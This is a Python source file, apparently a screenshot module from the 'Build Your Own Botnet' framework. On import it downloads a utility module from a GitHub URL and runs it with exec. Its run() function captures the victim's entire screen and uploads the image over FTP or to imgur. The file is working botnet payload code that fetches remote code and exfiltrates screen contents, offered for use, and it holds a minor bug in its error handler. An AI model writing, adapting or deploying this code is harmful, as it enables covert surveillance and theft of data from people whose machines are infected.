#!/usr/bin/python
# -*- coding: utf-8 -*-
'Screenshot (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import urllib

# utilities
util = imp.new_module('util')
exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
sys.modules['util'] = util

# globals
packages    = ['mss']
platforms   = ['win32','linux2','darwin']

# setup
util.is_compatible(platforms, __name__)
util.imports(packages, __builtins__)

# main
def run(upload_method=None):
    """ 
    Capture a screenshot

    `Optional`
    :param str upload_method:    ftp, imgur
    """
    if upload_method:
        try:
            assert isinstance(upload_method, str), "argument 'upload_method' must be of type '{}'".format(str)
            if 'mss' in globals():
                if upload_method in ('ftp', 'imgur'):
                    with mss.mss() as screen:
                        img = screen.grab(screen.monitors[0])
                    png     = util.png(img)
                    result  = getattr(util, upload_method)(png)
                    return getattr(util, upload_method)(result)
                else:
                    return "invalid upload method '{}' for module 'screenshot' (valid: ftp, imgur)".format(upload_method)
            else:
                return "missing package 'mss' is required for module 'screenshot'"
        except Exception as e:
            util.log("{} error: {}".format(self.screenshot.func_name, str(e)))
    else:
        return "missing argument 'upload_method' is required to run module 'screenshot'"

